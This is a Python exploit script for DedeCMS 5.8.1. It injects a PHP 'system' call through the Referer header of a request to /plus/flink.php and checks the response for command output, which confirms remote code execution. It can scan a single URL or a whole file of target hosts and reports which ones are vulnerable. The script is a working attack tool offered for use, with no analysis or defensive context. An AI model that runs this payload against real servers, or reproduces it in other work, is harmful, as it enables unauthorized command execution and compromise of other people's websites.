#!/usr/bin/env python
# -*- conding:utf-8 -*-
import requests
import argparse
import sys
import urllib3
import re
from prettytable import PrettyTable
urllib3.disable_warnings()


def title():
    print("""
                                  Dedecms_5.8.1 Codes Bugs
                                       python3.6 Environment
                                 <?php "system"('Command');?>
                                        by: ANF
                                
               """)


class Information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        target_url = self.url + "/plus/flink.php?dopost=save"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Referer": '<?php "system"(id);?>'
        }
        try:
            res = requests.get(url=target_url,headers=headers,verify=False,timeout=5)
            if "uid" in res.text and res.status_code == 200:
                pattern = re.compile(r"location='(.*)")
                cmd_id = pattern.findall(res.text)[0]
                return self.url, True, cmd_id
            else:
                return self.url, False, "NULL"
        except Exception as e:
            return self.url, "Error", e

    def file_url(self):
        file_results = []
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                result = Information.target_url(self)
                file_results.append(result)
            return file_results


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description='Dedecms_5.8.1 Codes error')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  Config Error！\neg1:>>>python3 dedecms_5.8.1_RCE.py -u http://127.0.0.1\neg2:>>>python3 dedecms_5.8.1_RCE.py -f ip.txt")
    elif args.url:
        results = Information(args).target_url()
        if results[1] is True:
            print(f"\033[31m[{chr(8730)}] target system: {results[-1]} codes running error is existing！\033[0m")
            print(f"[{chr(8730)}] react:{results[1]}")
        elif results[1] is False:
            print(f"[\033[31mx\033[0m]  target system: {results[-1]} codes running error is not existing！")
            print("[" + "-" * 100 + "]")
        elif results[1] == "Error":
            print("[\033[31mX\033[0m]  connect failed！")
            print("[" + "-"*100 + "]")
    elif args.file:
        results = Information(args).file_url()
        k = 0
        table = PrettyTable(['serial number', 'address', 'bugs', 'react'])
        for i in results:
            if i[1] is True:
                table.add_row([k+1, i[0], i[1], i[2]])
                k = k + 1
            elif i[1] is False:
                table.add_row([k+1, i[0], i[1], i[2]])
                k = k + 1
            elif i[1] == "Error":
                table.add_row([k+1, i[0], i[1], i[2]])
                k = k + 1
        print(table)




